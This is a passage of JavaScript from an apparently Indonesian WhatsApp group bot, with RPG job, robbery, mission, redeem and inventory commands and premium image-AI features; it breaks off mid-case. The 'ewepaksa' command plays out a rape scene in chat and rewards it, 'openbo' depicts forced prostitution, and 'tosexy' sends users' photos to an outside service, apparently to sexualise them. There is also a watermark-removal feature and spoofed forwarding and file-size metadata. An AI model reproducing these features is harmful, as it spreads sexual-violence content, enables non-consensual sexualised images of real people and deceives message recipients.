        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return reply(`Kamu sudah bekerja\nSaatnya istirahat selama ${clockString(time - new Date())}`)
        let hasilojek = Math.floor(Math.random() * 10000)
        reply(`Kamu Sudah Mengantarkan *${penumpang}* ğŸš—\nDan mendapatkan uang senilai *Rp ${hasilojek} ğŸ’°*`).then(() => {
          db.users[m.sender].saldo += hasilojek
          global.db.erpg[m.sender].lastkerja = new Date * 1
        })
        break
      case 'pedagang':
        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return reply(`Kamu sudah bekerja\nSaatnya istirahat selama\nğŸ•œ ${clockString(time - new Date())}`)
        let hasildagang = Math.floor(Math.random() * 10000)
        reply(`Ada pembeli yg membeli *${dagangan}* ğŸ›’\nDan mendapatkan uang senilai *Rp ${hasildagang} ğŸ’°*`).then(() => {
          db.users[m.sender].saldo += hasildagang
          global.db.erpg[m.sender].lastkerja = new Date * 1
        })
        break
      case 'dokter':
        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return reply(`Kamu sudah bekerja\nSaatnya istirahat selama\nğŸ•œ ${clockString(time - new Date())}`)
        let hasildokter = Math.floor(Math.random() * 10000)
        reply(`Kamu menyembuhkan pasien *${pasien}* ğŸ’‰\nDan mendapatkan uang senilai *Rp ${hasildokter}* ğŸ’°`).then(() => {
          db.users[m.sender].saldo += hasildokter
          global.db.erpg[m.sender].lastkerja = new Date * 1
        })
        break
      case 'petani':
        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return reply(`Kamu sudah bekerja\nSaatnya istirahat selama\nğŸ•œ ${clockString(time - new Date())}`)
        let hasiltani = Math.floor(Math.random() * 10000)
        reply(`${panen} Sudah Panen !ğŸŒ½ Dan menjualnya ğŸ§º\nDan mendapatkan uang senilai Rp *${hasiltani} ğŸ’°*`).then(() => {
          db.users[m.sender].saldo += hasiltani
          global.db.erpg[m.sender].lastkerja = new Date * 1
        })
        break
      case 'montir':
        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return reply(`Kamu sudah bekerja\nSaatnya istirahat selama\nğŸ•œ ${clockString(time - new Date())}`)
        let hasilmontir = Math.floor(Math.random() * 10000)
        reply(`Kamu Baru saja mendapatkan pelanggan dan memperbaiki *${bengkel} ğŸ”§*\nDan kamu mendapatkan uang senilai *Rp ${hasilmontir}* ğŸ’°`).then(() => {
          db.users[m.sender].saldo += hasilmontir
          global.db.erpg[m.sender].lastkerja = new Date * 1
        })
        break
      case 'kuli':
        if (new Date - global.db.erpg[m.sender].lastkerja < 600000) return reply(`Kamu sudah bekerja\nSaatnya istirahat selama\nğŸ•œ ${clockString(time - new Date())}`)
        let hasilkuli = Math.floor(Math.random() * 10000)
        reply(`Kamu baru saja selesai ${rumah} ğŸ”¨\nDan mendapatkan uang senilai *Rp ${hasilkuli} ğŸ’°*`).then(() => {
          db.users[m.sender].saldo += hasilkuli
          global.db.erpg[m.sender].lastkerja = new Date * 1
        })
        break
      default:
        let teks = `\n*ğŸ’¼ RPG - KERJA ğŸ’¼*\n\n*Select you job* :\n  ${vircion} â€¢ montir\n  ${vircion} â€¢ kuli\n  ${vircion} â€¢ petani\n  ${vircion} â€¢ dokter\n  ${vircion} â€¢ pedagang\n  ${vircion} â€¢ ojek\n\n*Contoh* :\n${cmd} kuli`
        sock.sendMessage(m.chat, { text: teks, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", serverMessageId: null, newsletterName: `${namaBot}` }, externalAdReply: { title: "RPG - JOB SIMULATOR", body: 'Choose a job and enjoy the results', thumbnailUrl: "https://pomf2.lain.la/f/x1pvc1mq.jpg", sourceUrl: "tes", mediaType: 1, renderLargerThumbnail: true } } }, { quoted: fakeQuoted })
    }
    break
  }

  case 'merampok':
  case 'rampok': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!m.isGroup) return onlyGrup()
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    if (global.db.erpg[m.sender].stamina < 1) return reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
    let hasil = (Math.floor(Math.random() * 5000))
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if (!m.mentionedJid[0] && !m.quoted && !text) return reply(`*Tag/Reply Target!*\n\nContoh :\n${cmd} @0`)
    if (users == m.sender) return reply("Gak bisa ngerampok diri sendiri")
    let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastrampok)
    if (new Date() - global.db.erpg[m.sender].lastrampok < 3600000) return reply(`Kamu Baru Saja ${command}, ${waktuu} Yang Lalu, Tunggu Lagi Setelah selesai.`)
    if (db.users[users].saldo < 5000) return reply("Target kismin")
    db.users[users].saldo -= hasil * 1
    db.users[m.sender].saldo += hasil * 1
    global.db.erpg[m.sender].lastrampok = new Date * 1
    reply(`Target Berhasil Dirampok Dan Mendapatkan Rp ${hasil}`)
    break
  }

  case 'ewepaksa':
  case 'ewe-paksa': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!m.isGroup) return onlyGrup()
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    if (global.db.erpg[m.sender].stamina < 1) return reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if (!m.mentionedJid[0] && !m.quoted && !text) return reply(`*Tag/Reply Target!*\n\nContoh :\n${cmd} @0`)
    let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastewe)
    if (new Date() - global.db.erpg[m.sender].lastewe < 43200000) return reply(`Kamu Baru Saja ngwe, ${waktuu} Yang Lalu, ewe Lagi nanti.`)
    let uang = await randomNomor(3000, 19000)
    let exp = await randomNomor(3444, 7897)
    reply(`kamu membawa nya ke kamar dan membuka paksa baju nya...`)
    await sleep(3000)
    reply(`Ehh Mau Ngapainn ğŸ˜£ğŸ˜£...`)
    await sleep(3000)
    reply(`Ahhh Pelan Pelann, SakitttğŸ˜–ğŸ˜–ğŸ˜–....\nAHHH...AHHHH...Pelan Pelan...ğŸ˜–ğŸ˜–ğŸ˜–`)
    await sleep(3000)
    reply(`Ahhhh, Sakitttt!! >////<\nPlok...Plokkk...PlokkkkğŸ˜©ğŸ˜–`)
    await sleep(3000)
    reply(`ğŸ˜–Ahhhh.... Penuhhh.... AngetttğŸ˜–`)
    await sleep(3000)
    reply(`*â€”[ Hasil Ewe ${db.users[m.sender].nama} ]â€”* \nâ¤ ğŸ’° Uang = [ ${uang} ] \nâ¤ âœ¨ Exp = [ ${exp} ] \nâ¤ ğŸ—ï¸ Tugas Selesai = +1`)
    db.users[m.sender].saldo += uang
    db.users[m.sender].exp += exp
    global.db.erpg[m.sender].lastewe = new Date * 1
    break
  }

  case 'open-bo':
  case 'openbo': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    if (global.db.erpg[m.sender].stamina < 1) return reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
    let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastopenbo)
    if (new Date() - global.db.erpg[m.sender].lastopenbo < 54000000) return reply(`Kamu Baru Saja ${command}, ${waktuu} Yang Lalu, Tunggu Lagi Setelah selesai.`)
    let uwong = ['Azril', 'Amba', 'MarkZukbrg', 'Mulyono', 'Andree']
    let userpname = pickRandom(uwong)
    let hotel = await randomNomor(3, 6)
    let uang = await randomNomor(7000, 34000)
    let expusr = await randomNomor(8000, 13000)
    let limit = await randomNomor(20, 80)
    let stamina = await randomNomor(45, 85)
    reply('Sedang Mencari Pelanggan...')
    await sleep(5000)
    reply(`Kamu Mendapatkan Pelanggan Bernama ${userpname} Dan Pergi Ke Hotel Bintang ${hotel}`)
    await sleep(4000)
    reply('Kamu Pun Mulai Melakukan Nganu Dengannya')
    await sleep(6000)
    reply('Kamu Di Paksa Untuk Melayaninya 24 Jam')
    await sleep(4000)
    reply(`Kamu Terbaring Lemas Karna Melakukan\nNgentod 24 Jam Dengan ${userpname},\nTetapi Kamu Mendapatkan : \n\nUang : ${uang}\nExp : ${expusr}\nLimit : ${limit}\n\nStamina berkurang ${stamina}%`)
    db.users[m.sender].saldo += uang
    db.users[m.sender].exp += expusr
    db.users[m.sender].limit += limit
    global.db.erpg[m.sender].stamina -= stamina
    global.db.erpg[m.sender].lastopenbo = new Date * 1
    break
  }

  case 'daily-misi':
  case 'dailymisi': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    if (global.db.erpg[m.sender].stamina < 1) return reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
    let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastdailymisi)
    if (new Date() - global.db.erpg[m.sender].lastdailymisi < 86400000) return reply(`Kamu Baru Saja ${command}, ${waktuu} Yang Lalu, Tunggu Lagi Setelah selesai.`)
    let misiget = ['Menangkap 30 lalat dalam 30 detik', 'Ngentod Janda', 'Menangkap anomali', 'Menangkap Maling', 'Menangkap Buronan', 'Menangkap azril', 'Mengejar Ilham', 'Membunuh MarkZukberg', 'Membunuh Tuhan', 'Berburu Perawan']
    let mission = pickRandom(misiget)
    let uang = await randomNomor(7000, 34000)
    let expget = await randomNomor(8000, 13000)
    let limit = await randomNomor(20, 80)
    let stamina = await randomNomor(45, 85)
    reply('Mencari Misi...')
    await sleep(3000)
    reply(`Misi ${mission} Berhasil Didapatkan`)
    await sleep(4000)
    reply('Mengerjakan misi...')
    await sleep(10000)
    reply(`${sock.getName(m.sender)} Berhasil Menyelesaikan Misi\nDan Kamu Mendapatkan :\nUang : ${uang}\nExp : ${expget}\nLimit : ${limit}\n\nSramina Berkurang ${stamina}%`)
    db.users[m.sender].saldo += uang
    db.users[m.sender].exp += expget
    db.users[m.sender].limit += limit
    global.db.erpg[m.sender].stamina -= stamina
    global.db.erpg[m.sender].lastdailymisi = new Date * 1
    break
  }

  case 'ngaji':
  case 'mengaji': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastngaji)
    if (new Date() - global.db.erpg[m.sender].lastngaji < 14400000) return reply(`Kamu Baru Saja ${command}, ${waktuu} Yang Lalu, Tunggu Lagi Setelah selesai.`)
    let uang = randomNomor(3000, 6000)
    let expget = randomNomor(3000, 5000)
    reply('Mencari Guru Ngaji....')
    await sleep(7000)
    reply('Ketemu ustadz..')
    await sleep(4000)
    reply('Diajarin tajwid')
    await sleep(3000)
    reply('Ngasih tau, kalo qalqalah itu dipantulkan')
    await sleep(3000)
    reply(`*â€”[ Hasil Ngaji ]â€”*\nâ•ğŸ’¹ Uang jajan: ${uang}\nâ•âœ¨ Exp: ${expget}\nâ•ğŸ¤¬ Dimarahin: -1`)
    db.users[m.sender].saldo += uang
    db.users[m.sender].exp += expget
    global.db.erpg[m.sender].lastngaji = new Date * 1
    break
  }

  case 'skillcek':
  case 'cekskill': {
    let setting = JSON.parse(fs.readFileSync('./rpg.json'))
    if (setting.rpgsetStats) return reply('Fitur rpg dimatikan oleh owner')
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    reply(`${global.db.erpg[m.sender].skillselect ? `Skill kamu : ${global.db.erpg[m.sender].skillselect}` : 'Kamu Belum Memiliki Skill'}`)
    break
  }

  case 'redem':
  case 'redeem': {
    db.redeem = db.redeem || { isRedeem: false, code: "", user: [], maxRedeem: 0 }
    if (!db.redeem.isRedeem) return reply('Tidak ada redeem yang di berikan')
    if (!text) return reply('Masukan kode!')
    if (db.redeem.isRedeem) {
      let code = text.toLowerCase()
      let redeem = db.redeem.code.toLowerCase()
      if (code !== redeem) return reply('Kode kamu gak valid!')
      if (db.redeem.maxRedeem < 1) return reply('Kode udah abiss cokk')
      if (db.redeem.user.includes(m.sender)) return reply('Kamu sudah claim kode ini!')
      let uang = await randomNomor(100000, 3000000)
      let expgt = await randomNomor(3000, 8000)
      let limiter = await randomNomor(1000, 5000)
      let glimiter = await randomNomor(1000, 7000)
      db.redeem.user.push(m.sender)
      db.redeem.maxRedeem -= 1
      db.users[m.sender].saldo += uang
      db.users[m.sender].exp += expgt
      db.users[m.sender].limit += limiter
      db.users[m.sender].glimit += glimiter
      let teks = `*CONGRATULATION ğŸ¥³*\n\n*Kamu Mendapatkan* :\n-  Rp ${toRupiah(uang)} Balance\n-  ${expgt} Exp\n-  ${limiter} Limit\n-  ${glimiter} Game Limit`
      reply(teks)
      if (db.redeem.maxRedeem < 1) {
        await timeout(600000)
        delete db.redeem
      }
    } else {
      reply("*Gak ada redeem yang di berikan ğŸ˜“*")
    }
    break
  }

  case 'redemset':
  case 'setredem':
  case 'redeemset':
  case 'setredeem': {
    if (!isOwner) return onlyOwn()
    db.redeem = db.redeem || { isRedeem: false, code: "", user: [], maxRedeem: 0 }
    if (!args[0]) return reply(`*Masukin Kode Redemnya!*\n\nContoh:\n${prefix + command} NewUpdate 10`)
    if (!args[1]) return reply(`*Masukin Jumlah Tersedia!*\n\nContoh:\n${prefix + command} NewUpdate 10`)
    if (isNaN(args[1])) return reply(`*Jumlah Harus Angka!*\n\nContoh:\n${prefix + command} NewUpdate 10`)
    db.redeem.isRedeem = true
    db.redeem.code = args[0]
    db.redeem.user = []
    db.redeem.maxRedeem = args[1]
    reply('Code Redeem, Berhasil Di Setting*')
    break
  }

  case 'delredeem':
  case 'redeemdel': {
    if (!isOwner) return onlyOwn()
    db.redeem = db.redeem || { isRedeem: false, code: "", user: [], maxRedeem: 0 }
    if (db.redeem.isRedeem) {
      reply('*Redeem Code Dihapus!*')
      delete db.redeem
    } else {
      reply('*Tidak ada sesi redeem*')
    }
    break
  }

  case 'listredem':
  case 'redemlist':
  case 'redeemlist':
  case 'listredeem': {
    if (!isOwner) return onlyOwn()
    if (!db.redeem) return reply('Tidak ada data redeem')
    if (db.redeem.user.length === 0) return reply('Tidak ada nomor yang sudah redeem')
    let list = 'Daftar Nomor yang Sudah Redeem:\n\n'
    db.redeem.user.forEach((nomor, index) => {
      list += `${index + 1}. ${nomor}\n`
    })
    reply(list)
    break
  }

  case 'inv':
  case 'inventory': {
    let { rank, rankid } = await ranke(m.sender)
    if (!global.db.erpg[m.sender].rpg) return reply(`â€” *Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
    let teks = `*âš”ï¸ RPG - PROFILE âš”ï¸*\n\n_*User Profile ğŸ¤º*_\n  ${vircion} â€¢ Name: ${db.users[m.sender].nama}\n  ${vircion} â€¢ Money: ${db.users[m.sender].saldo}\n  ${vircion} â€¢ User Healthy: ${global.db.erpg[m.sender].darahuser}/100%\n  ${vircion} â€¢ Skill: ${global.db.erpg[m.sender].skillselect ? `(${global.db.erpg[m.sender].skillselect})` : 'Nothing'}\n  ${vircion} â€¢ Makanan: ${global.db.erpg[m.sender].makanan}\n  ${vircion} â€¢ Potion: ${global.db.erpg[m.sender].potion}\n  ${vircion} â€¢ Keberadaan: ${global.db.erpg[m.sender].wilayah}\n  ${vircion} â€¢ Kapal: ${global.db.erpg[m.sender].kapal ? `(${global.db.erpg[m.sender].darahkapal}% HP)` : 'Nothing'}\n  ${vircion} â€¢ Rumah: ${global.db.erpg[m.sender].rumah} Unit\n  ${vircion} â€¢ Kapak: ${global.db.erpg[m.sender].kapak ? `(${global.db.erpg[m.sender].darahkapak}% HP)` : 'Nothing'}\n  ${vircion} â€¢ Pickaxe: ${global.db.erpg[m.sender].pickaxe ? `(${global.db.erpg[m.sender].darahpickaxe}% HP)` : 'Nothing'}\n  ${vircion} â€¢ Baju Zirah: ${global.db.erpg[m.sender].bzirah ? `(${global.db.erpg[m.sender].darahbzirah}% HP)` : 'Nothing'}\n  ${vircion} â€¢ Pedang: ${global.db.erpg[m.sender].pedang ? `(${global.db.erpg[m.sender].darahpedang}% HP)` : 'Nothing'}\n  ${vircion} â€¢ Kain: ${global.db.erpg[m.sender].kain} Lembar\n\n_*Sumber Daya ğŸ§°*_\n  ${vircion} â€¢ Kayu: ${global.db.erpg[m.sender].kayu}\n  ${vircion} â€¢ Besi: ${global.db.erpg[m.sender].besi}\n  ${vircion} â€¢ Emas: ${global.db.erpg[m.sender].emas}\n  ${vircion} â€¢ Perak: ${global.db.erpg[m.sender].perak}\n  ${vircion} â€¢ Batubara: ${global.db.erpg[m.sender].batubara}\n  ${vircion} â€¢ Emerald: ${global.db.erpg[m.sender].emerald}\n  ${vircion} â€¢ Diamond: ${global.db.erpg[m.sender].diamond}\n  ${vircion} â€¢ Common: ${global.db.erpg[m.sender].common}\n  ${vircion} â€¢ Uncommon: ${global.db.erpg[m.sender].uncommon}\n  ${vircion} â€¢ Mythic: ${global.db.erpg[m.sender].mythic}\n  ${vircion} â€¢ Legendary: ${global.db.erpg[m.sender].legendary}\n\n_*Hewan & TernakğŸ„*_\n  ${vircion} â€¢ Ayam: ${global.db.erpg[m.sender].ayam} Ekor \n  ${vircion} â€¢ Sapi: ${global.db.erpg[m.sender].sapi} Ekor\n  ${vircion} â€¢ Domba: ${global.db.erpg[m.sender].domba} Ekor\n  ${vircion} â€¢ Ikan: ${global.db.erpg[m.sender].ikan} Ekor\n  ${vircion} â€¢ Banteng: ${global.db.erpg[m.sender].banteng} Ekor \n  ${vircion} â€¢ Gajah: ${global.db.erpg[m.sender].gajah} Ekor\n  ${vircion} â€¢ Harimau: ${global.db.erpg[m.sender].harimau} Ekor\n  ${vircion} â€¢ Kambing: ${global.db.erpg[m.sender].kambing} Ekor\n  ${vircion} â€¢ Panda: ${global.db.erpg[m.sender].panda} Ekor\n  ${vircion} â€¢ Buaya: ${global.db.erpg[m.sender].buaya} Ekor\n  ${vircion} â€¢ Kerbau: ${global.db.erpg[m.sender].kerbau} Ekor\n  ${vircion} â€¢ Monyet: ${global.db.erpg[m.sender].monyet} Ekor\n  ${vircion} â€¢ Babihutan: ${global.db.erpg[m.sender].babihutan} Ekor\n  ${vircion} â€¢ Babi: ${global.db.erpg[m.sender].babi} Ekor\n\n_*Hewan LautğŸŒŠ*_\n  ${vircion} â€¢ Ikan: ${global.db.erpg[m.sender].ikan} Ekor\n  ${vircion} â€¢ Paus: ${global.db.erpg[m.sender].paus} Ekor\n  ${vircion} â€¢ Gurita: ${global.db.erpg[m.sender].gurita} Ekor\n  ${vircion} â€¢ Kepiting: ${global.db.erpg[m.sender].kepiting} Ekor\n  ${vircion} â€¢ Cumi: ${global.db.erpg[m.sender].cumi} Ekor\n  ${vircion} â€¢ Buntal: ${global.db.erpg[m.sender].buntal} Ekor\n  ${vircion} â€¢ Dory: ${global.db.erpg[m.sender].dory} Ekor\n  ${vircion} â€¢ Lumba: ${global.db.erpg[m.sender].lumba} Ekor\n  ${vircion} â€¢ Lobster: ${global.db.erpg[m.sender].lobster} Ekor\n  ${vircion} â€¢ Hiu: ${global.db.erpg[m.sender].hiu} Ekor\n  ${vircion} â€¢ Udang: ${global.db.erpg[m.sender].udang} Ekor\n  ${vircion} â€¢ Orca: ${global.db.erpg[m.sender].orca} Ekor\n  \n_*Buah BuahanğŸ‡*_\n  ${vircion} â€¢ Anggur: ${global.db.erpg[m.sender].anggur}\n  ${vircion} â€¢ Jeruk: ${global.db.erpg[m.sender].jeruk}\n  ${vircion} â€¢ Mangga: ${global.db.erpg[m.sender].mangga}\n  ${vircion} â€¢ Pisang: ${global.db.erpg[m.sender].pisang}\n  \n_*Items LainnyağŸ—ï¸*_\n  ${vircion} â€¢ Botol: ${global.db.erpg[m.sender].botol}\n  ${vircion} â€¢ Kardus: ${global.db.erpg[m.sender].kardus}\n  ${vircion} â€¢ Kaleng: ${global.db.erpg[m.sender].kaleng}\n  ${vircion} â€¢ Gelas: ${global.db.erpg[m.sender].gelas}\n  ${vircion} â€¢ Plastik: ${global.db.erpg[m.sender].plastik}\n  ${vircion} â€¢ Bulu: ${global.db.erpg[m.sender].bulu}\n  ${vircion} â€¢ Bibit Anggur: ${global.db.erpg[m.sender].bibitanggur}\n  ${vircion} â€¢ Bibit Pisang: ${global.db.erpg[m.sender].bibitpisang}\n  ${vircion} â€¢ Bibit Apel: ${global.db.erpg[m.sender].bibitapel}\n  ${vircion} â€¢ Bibit Mangga: ${global.db.erpg[m.sender].bibitmangga}\n  ${vircion} â€¢ Bibit Jeruk: ${global.db.erpg[m.sender].bibitjeruk}`
    await sock.sendMessage(m.chat, { document: { url: thumbnail }, fileName: `${namaBot}`, fileLength: 100000000000000, pageCount: 2024, caption: teks, contextInfo: { mentionedJid: [sender], forwardingScore: 999, isForwarded: true, externalAdReply: { containsAutoReply: true, mediaType: 1, mediaUrl: ``, renderLargerThumbnail: true, showAdAttribution: true, sourceUrl: ``, thumbnailUrl: `${global.thumbnail2}`, title: `${namaBot}`, body: `${Waktu} kak`, mentionedJid: [sender], isForwarded: true }, forwardedNewsletterMessageInfo: { newsletterJid: null + "@newsletter", newsletterName: `${namaBot}`, serverMessageId: 143 }, businessMessageForwardInfo: { businessOwnerJid: sock.decodeJid(sock.user.id) } }, footer: `${namaBot}`, buttons: [{ buttonId: `.weekly`, buttonText: { displayText: 'Weekly' } }, { buttonId: `.monthly`, buttonText: { displayText: 'Monthly' } }], headerType: 6, viewOnce: true }, { quoted: fakeQuoted })
    break
  }

  case 'ww':
  case 'werewolf': {
    let jimp = require("jimp")
    const resize = async (image, width, height) => {
      const read = await jimp.read(image)
      const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
      return data
    }
    let { emoji_role, sesi, playerOnGame, playerOnRoom, playerExit, dataPlayer, dataPlayerById, getPlayerById, getPlayerById2, killWerewolf, killww, dreamySeer, sorcerer, protectGuardian, roleShuffle, roleChanger, roleAmount, roleGenerator, addTimer, startGame, playerHidup, playerMati, vote, voteResult, clearAllVote, getWinner, win, pagi, malam, skill, voteStart, voteDone, voting, run, run_vote, run_malam, run_pagi } = require('./ZionLibrary/werewolf.js')
    let thumb = "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg"
    const { sender, chat } = m
    sock.werewolf = sock.werewolf ? sock.werewolf : {}
    const ww = sock.werewolf ? sock.werewolf : {}
    const data = ww[chat]
    const value = args[0]
    const target = args[1]
    if (value === "create") {
      if (chat in ww) return reply("Group masih dalam sesi permainan")
      if (playerOnGame(sender, ww) === true) return reply("Kamu masih dalam sesi game")
      ww[chat] = { room: chat, owner: sender, status: false, iswin: null, cooldown: null, day: 0, time: "malem", player: [], dead: [], voting: false, seer: false, guardian: [] }
      await reply("Room berhasil dibuat, ketik *.ww join* untuk bergabung")
    } else if (value === "join") {
      if (!ww[chat]) return reply("Belum ada sesi permainan")
      if (ww[chat].status === true) return reply("Sesi permainan sudah dimulai")
      if (ww[chat].player.length > 16) return reply("Maaf jumlah player telah penuh")
      if (playerOnRoom(sender, chat, ww) === true) return reply("Kamu sudah join dalam room ini")
      if (playerOnGame(sender, ww) === true) return reply("Kamu masih dalam sesi game")
      let data = { id: sender, number: ww[chat].player.length + 1, sesi: chat, status: false, role: false, effect: [], vote: 0, isdead: false, isvote: false }
      ww[chat].player.push(data)
      let player = []
      let text = `\n*âŒ‚ W E R E W O L F - P L A Y E R*\n\n`
      for (let i = 0; i < ww[chat].player.length; i++) {
        text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace("@s.whatsapp.net", "")}\n`
        player.push(ww[chat].player[i].id)
      }
      text += "\nJumlah player minimal adalah 5 dan maximal 15"
      sock.sendMessage(m.chat, { text: text.trim(), contextInfo: { externalAdReply: { title: "W E R E W O L F", mediaType: 1, renderLargerThumbnail: true, thumbnail: thumb } } }, { quoted: m })
    }
    break
  }
      /*
      EDIT IMG   
      */
      
      case 'rwm':
      case 'removewatermark':
      case 'removewm': {
    if (!isPremium) return reply(mess.prem)

    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';

    if (!/image/.test(mime)) return reply(`mana foto nya?`);

    reply('â³ Sedang menghapus watermark...');

    let mediaPath;

    try {
        // download file
        mediaPath = await sock.downloadAndSaveMediaMessage(q);

        // kirim file lokal ke API
        const apiResult = await ezremove(mediaPath);

        if (!apiResult.result) {
            return reply("âŒ Gagal menghapus watermark!");
        }

        const urlHasil = apiResult.result;

        // download hasil gambar
        const hasil = await axios.get(urlHasil, { responseType: 'arraybuffer' });

        await sock.sendMessage(m.chat, {
            image: hasil.data,
            caption: ""
        }, { quoted: fakeQuoted });

    } catch (error) {
        console.error('Error di removewm:', error);
        reply(`âŒ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }

}
break;
case 'luma':
case 'lumaai':
case 'ailuma': {
    if (!isPremium) return reply(mess.prem)

    let imageUrl
    let mediaPath

    try {
        // =========================
        // 1ï¸âƒ£ JIKA PAKE URL
        // =========================
        if (text && /https?:\/\//i.test(text)) {
            reply('â³ Menggunakan URL gambar...')
            imageUrl = text
        } 
        // =========================
        // 2ï¸âƒ£ JIKA REPLY / KIRIM FOTO
        // =========================
        else {
            const quotedMsg = m.quoted ? m.quoted : m
            const mime = (quotedMsg.msg || quotedMsg).mimetype || ''

            if (!/image/.test(mime)) {
                return reply(
                    'ğŸ“¸ Kirim / reply foto atau gunakan URL gambar!\n\nContoh:\n.luma https://example.com/image.jpg'
                )
            }

            reply('â³ Mengunduh foto...')
            mediaPath = await sock.downloadAndSaveMediaMessage(quotedMsg)

            reply('â« Upload ke CatBox...')
            const media = await CatBox(mediaPath)

            // âš ï¸ CatBox kadang return string, kadang object
            imageUrl = media?.url || media
        }

        if (!imageUrl) throw 'Upload gambar gagal!'

        // =========================
        // 3ï¸âƒ£ REQUEST KE LUMA API
        // =========================
        reply('ğŸ¬ Generating video dengan LumaAI...')
        const result = await fetchJson(
            `${global.api.base}/api/luma?url=${encodeURIComponent(imageUrl)}&key=${global.api.key}`
        )

        // =========================
        // 4ï¸âƒ£ AMBIL VIDEO URL (FLEXIBLE)
        // =========================
        const videoUrl =
            result?.video_url ||
            result?.result ||
            result?.url ||
            result?.data?.video ||
            null

        if (!videoUrl || !/https?:\/\//i.test(videoUrl))
            throw 'LumaAI tidak mengembalikan video!'

        // =========================
        // 5ï¸âƒ£ KIRIM VIDEO
        // =========================
        await sock.sendMessage(m.chat, {
            video: { url: videoUrl },
            caption: `ğŸ¬ *Video berhasil dibuat!*\nâœ¨ Powered by LumaAI`
        }, { quoted: fakeQuoted })

        // =========================
        // 6ï¸âƒ£ CLEAN FILE
        // =========================
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath)
        }

    } catch (err) {
        console.error(err)
        reply(`âŒ Error proses:\n${err?.message || err}`)
    }
}
break
case 'tofigurav3':
case 'tofigurav2':
case 'tofigura': {

if (!isPremium) return reply(mess.prem)

const q = m.quoted ? m.quoted : m
const mime = (q.msg || q).mimetype || ''

if (!/image/.test(mime)) {
    return reply('mana foto nya?')
}

reply('Loading...')

let mediaPath
try {

    // download gambar user
    mediaPath = await sock.downloadAndSaveMediaMessage(q)
    let directLink = await CatBox(mediaPath)

    // request API
    const apiUrl = `https://api-faa.my.id/faa/${command}?url=${directLink}`
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' })

    // simpan hasil AI sementara
    const resultPath = `./tmp/${Date.now()}.jpg`
    fs.writeFileSync(resultPath, response.data)

    // upload hasil AI ke catbox
    const resultUrl = await CatBox(resultPath)

    // kirim interactive message (URL, BUKAN BUFFER)
    await sock.sendMessage(m.chat, {
        interactiveMessage: {
            title: "âœ… Success",
            footer: "Foto miniatur berhasil dibuat",
            image: { url: resultUrl },
            buttons: [
                {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Hidupkan foto",
                        id: `.luma ${resultUrl}`
                    })
                }
            ]
        }
    }, { quoted: fakeQuoted })

    fs.unlinkSync(resultPath)

} catch (err) {
    console.error('Error di fitur aiedit:', err)
    reply('âŒ Terjadi kesalahan saat memproses gambar.')
} finally {
    if (mediaPath && fs.existsSync(mediaPath)) {
        fs.unlinkSync(mediaPath)
    }
}
}
break
       			
case 'jadisexy':
case 'tosexy': {

if (!isPremium) return reply(mess.prem)

 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return reply(`mana foto nya?`);
    }
 
    reply('Loading...');

    try {
        
        let media = await sock.downloadAndSaveMediaMessage(quoted);
        let directLink = await CatBox(media);
        
